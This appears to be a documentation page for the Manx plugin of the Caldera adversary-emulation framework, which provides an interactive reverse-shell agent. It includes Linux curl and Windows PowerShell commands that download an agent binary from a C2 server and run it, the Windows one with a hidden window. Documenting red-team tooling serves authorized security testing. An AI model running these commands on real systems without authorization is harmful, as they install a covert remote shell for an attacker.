---
type: Caldera Plugin
title: Manx Plugin
description: Manx provides an interactive shell-access agent for Caldera, enabling terminal sessions on target hosts rather than just automated command execution.
tags:
  - caldera
  - plugin
  - manx
  - shell
  - terminal
resource: /plugin/manx/gui
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T16:52:00Z'
status: stable
---

# Manx Plugin

Manx is Caldera's interactive shell agent. Unlike Sandcat (which executes discrete ability commands and returns), Manx provides a persistent **reverse shell** that operators can use interactively from the Caldera UI.

## Key Capabilities

- Interactive terminal session (reverse shell) to target hosts
- Supports Windows (cmd/PowerShell) and Linux/macOS (bash)
- Session managed through the Caldera UI at `/plugin/manx/gui`
- TCP-based communication back to Caldera

## Use Cases

- Manual exploration after automated discovery
- Ad-hoc commands not covered by existing abilities
- Privilege escalation validation
- Interactive credential testing

## Deployment

Manx agents are deployed similarly to Sandcat but using the Manx-specific binary:

```bash
# Linux
curl -s -X POST -H "file:manx.go-linux" -H "platform:linux" \
  http://192.168.8.121:8888/file/download > /tmp/manx && \
  chmod +x /tmp/manx && /tmp/manx -server http://192.168.8.121:8888 &
```

```powershell
# Windows
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","manx.go-windows")
[io.file]::WriteAllBytes("C:\Users\Public\manx.exe", $wc.DownloadData("http://192.168.8.121:8888/file/download"))
Start-Process "C:\Users\Public\manx.exe" -ArgumentList "-server http://192.168.8.121:8888" -WindowStyle Hidden
```
